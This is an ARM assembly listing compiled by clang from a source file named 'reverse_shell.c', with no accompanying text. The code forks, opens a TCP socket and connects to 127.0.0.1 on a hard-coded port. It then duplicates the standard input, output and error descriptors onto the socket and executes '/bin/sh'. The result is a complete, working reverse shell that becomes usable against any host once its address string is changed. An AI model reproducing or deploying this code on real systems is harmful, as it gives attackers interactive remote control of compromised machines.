	.text
	.syntax unified
	.eabi_attribute	67, "2.09"	@ Tag_conformance
	.cpu	arm7tdmi
	.eabi_attribute	6, 2	@ Tag_CPU_arch
	.eabi_attribute	8, 1	@ Tag_ARM_ISA_use
	.eabi_attribute	9, 1	@ Tag_THUMB_ISA_use
	.eabi_attribute	34, 0	@ Tag_CPU_unaligned_access
	.eabi_attribute	15, 1	@ Tag_ABI_PCS_RW_data
	.eabi_attribute	16, 1	@ Tag_ABI_PCS_RO_data
	.eabi_attribute	17, 2	@ Tag_ABI_PCS_GOT_use
	.eabi_attribute	20, 1	@ Tag_ABI_FP_denormal
	.eabi_attribute	21, 1	@ Tag_ABI_FP_exceptions
	.eabi_attribute	23, 3	@ Tag_ABI_FP_number_model
	.eabi_attribute	24, 1	@ Tag_ABI_align_needed
	.eabi_attribute	25, 1	@ Tag_ABI_align_preserved
	.eabi_attribute	38, 1	@ Tag_ABI_FP_16bit_format
	.eabi_attribute	18, 4	@ Tag_ABI_PCS_wchar_t
	.eabi_attribute	26, 2	@ Tag_ABI_enum_size
	.eabi_attribute	14, 0	@ Tag_ABI_PCS_R9_use
	.file	"reverse_shell.c"
	.globl	main                    @ -- Begin function main
	.p2align	2
	.type	main,%function
	.code	32                      @ @main
main:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#72
	sub	sp, sp, #72
	mov	r2, #0
	str	r2, [r11, #-4]
	str	r0, [r11, #-8]
	str	r1, [r11, #-12]
	str	r2, [sp, #36]           @ 4-byte Spill
	bl	fork
	mov	r1, #2
	strh	r1, [r11, #-28]
	ldr	r2, .LCPI0_0
.LPC0_0:
	add	r2, pc, r2
	str	r0, [sp, #32]           @ 4-byte Spill
	mov	r0, r2
	str	r1, [sp, #28]           @ 4-byte Spill
	bl	inet_addr
	str	r0, [r11, #-24]
	mov	r0, #412
	orr	r0, r0, #52224
	strh	r0, [r11, #-26]
	mov	r0, #1
	ldr	r1, [sp, #28]           @ 4-byte Reload
	str	r0, [sp, #24]           @ 4-byte Spill
	mov	r0, r1
	ldr	r1, [sp, #24]           @ 4-byte Reload
	ldr	r2, [sp, #36]           @ 4-byte Reload
	bl	socket
	str	r0, [r11, #-32]
	ldr	r0, [r11, #-32]
	sub	r1, r11, #28
	mov	r2, #16
	bl	connect
	ldr	r1, [r11, #-32]
	str	r0, [sp, #20]           @ 4-byte Spill
	mov	r0, r1
	ldr	r1, [sp, #36]           @ 4-byte Reload
	bl	dup2
	ldr	r1, [r11, #-32]
	str	r0, [sp, #16]           @ 4-byte Spill
	mov	r0, r1
	ldr	r1, [sp, #24]           @ 4-byte Reload
	bl	dup2
	ldr	r1, [r11, #-32]
	str	r0, [sp, #12]           @ 4-byte Spill
	mov	r0, r1
	ldr	r1, [sp, #28]           @ 4-byte Reload
	bl	dup2
	ldr	r1, .LCPI0_1
.LPC0_1:
	add	r1, pc, r1
	str	r0, [sp, #8]            @ 4-byte Spill
	mov	r0, r1
	ldr	r1, [sp, #36]           @ 4-byte Reload
	ldr	r2, [sp, #36]           @ 4-byte Reload
	bl	execve
	ldr	r1, [sp, #36]           @ 4-byte Reload
	str	r0, [sp, #4]            @ 4-byte Spill
	mov	r0, r1
	mov	sp, r11
	pop	{r11, lr}
	bx	lr
	.p2align	2
@ %bb.1:
.LCPI0_0:
	.long	.L.str-(.LPC0_0+8)
.LCPI0_1:
	.long	.L.str.1-(.LPC0_1+8)
.Lfunc_end0:
	.size	main, .Lfunc_end0-main
	.cantunwind
	.fnend
                                        @ -- End function
	.type	.L.str,%object          @ @.str
	.section	.rodata.str1.1,"aMS",%progbits,1
.L.str:
	.asciz	"127.0.0.1"
	.size	.L.str, 10

	.type	.L.str.1,%object        @ @.str.1
.L.str.1:
	.asciz	"/bin/sh"
	.size	.L.str.1, 8


	.ident	"clang version 9.0.1 "
	.section	".note.GNU-stack","",%progbits
